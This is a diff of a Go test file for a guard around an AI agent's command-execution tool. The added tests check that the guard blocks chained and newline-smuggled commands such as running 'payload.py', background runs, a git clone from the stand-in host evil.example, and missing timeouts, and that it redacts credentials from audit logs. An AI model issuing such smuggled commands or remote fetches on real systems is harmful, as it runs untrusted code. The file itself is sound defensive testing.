@@ -4,8 +4,11 @@
 package main
 
 import (
+	"bufio"
 	"context"
 	"encoding/json"
+	"errors"
+	"io"
 	"os"
 	"strings"
 	"testing"
@@ -72,12 +75,90 @@ func TestWrapperBlocksBeforeExecutionAndAudits(t *testing.T) {
 		t.Fatalf("execution=%t events=%+v", called, events)
 	}
 }
+
+func TestWrapperBlocksShellSegmentsAndBackground(t *testing.T) {
+	g, _ := loadTest(t)
+	for name, req := range map[string]Request{
+		"chained": {
+			ToolName: "workspace_exec", Command: "go test ./... && python3 payload.py",
+			Backend: "workspaceexec", TimeoutSeconds: 30,
+		},
+		"newline": {
+			ToolName: "workspace_exec", Command: "go test ./...\npython3 payload.py",
+			Backend: "workspaceexec", TimeoutSeconds: 30,
+		},
+		"background": {
+			ToolName: "host_exec", Command: "go test ./...", Backend: "hostexec",
+			TimeoutSeconds: 30, Background: true,
+		},
+	} {
+		t.Run(name, func(t *testing.T) {
+			called := false
+			wrapped := g.Wrap(func(context.Context, Request) (string, error) {
+				called = true
+				return "ran", nil
+			}, func(AuditEvent) error { return nil })
+			if _, e := wrapped(context.Background(), req); e == nil {
+				t.Fatal("expected block")
+			}
+			if called {
+				t.Fatal("blocked request reached executor")
+			}
+		})
+	}
+}
+
+func TestNetworkPolicyCoversGit(t *testing.T) {
+	g, _ := loadTest(t)
+	result := g.Scan(Request{
+		ToolName: "workspace_exec", Command: "git clone https://evil.example/repo",
+		Backend: "workspaceexec", TimeoutSeconds: 30,
+	})
+	if result.Decision != "deny" || result.RuleID != "NETWORK_NOT_ALLOWLISTED" {
+		t.Fatalf("git clone destination not denied: %+v", result)
+	}
+}
+
+func TestOmittedTimeoutIsDenied(t *testing.T) {
+	g, _ := loadTest(t)
+	result := g.Scan(Request{ToolName: "workspace_exec", Command: "go test ./...", Backend: "workspaceexec"})
+	if result.Decision != "deny" || result.RuleID != "TIMEOUT_LIMIT" {
+		t.Fatalf("omitted timeout not denied: %+v", result)
+	}
+}
 func TestRedaction(t *testing.T) {
 	g, _ := loadTest(t)
-	r := g.Scan(Request{ToolName: "x", Command: "echo token=abc123 | custom", Backend: "workspaceexec"})
+	command := `curl -H "Authorization: Bearer auth-fragment" --password flag-fragment ` +
+		`https://url-user:url-fragment@api.github.com -d 'secret="quoted value fragment"'`
+	r := g.Scan(Request{ToolName: "x", Command: command, Backend: "workspaceexec", TimeoutSeconds: 30})
 	data, _ := json.Marshal(r)
-	if strings.Contains(string(data), "abc123") || !r.Redacted {
-		t.Fatalf("secret leaked: %s", data)
+	for _, secret := range []string{"auth-fragment", "flag-fragment", "url-user", "url-fragment", "quoted value fragment"} {
+		if strings.Contains(string(data), secret) {
+			t.Fatalf("secret %q leaked: %s", secret, data)
+		}
+	}
+	if !r.Redacted {
+		t.Fatalf("redaction was not recorded: %s", data)
+	}
+}
+
+type errorWriteCloser struct {
+	writeErr error
+	closeErr error
+}
+
+func (w *errorWriteCloser) Write([]byte) (int, error) { return 0, w.writeErr }
+func (w *errorWriteCloser) Close() error              { return w.closeErr }
+
+func TestFlushAndCloseAuditReturnsErrors(t *testing.T) {
+	flushErr := errors.New("flush failed")
+	closeErr := errors.New("close failed")
+	target := &errorWriteCloser{writeErr: flushErr, closeErr: closeErr}
+	writer := bufio.NewWriterSize(target, 32)
+	_, _ = io.WriteString(writer, "audit")
+	err := flushAndCloseAudit(writer, target)
+	if !errors.Is(err, flushErr) || !errors.Is(err, closeErr) {
+		t.Fatalf("flush/close errors not propagated: %v", err)
 	}
 }
 func BenchmarkPerformance500Commands(b *testing.B) {
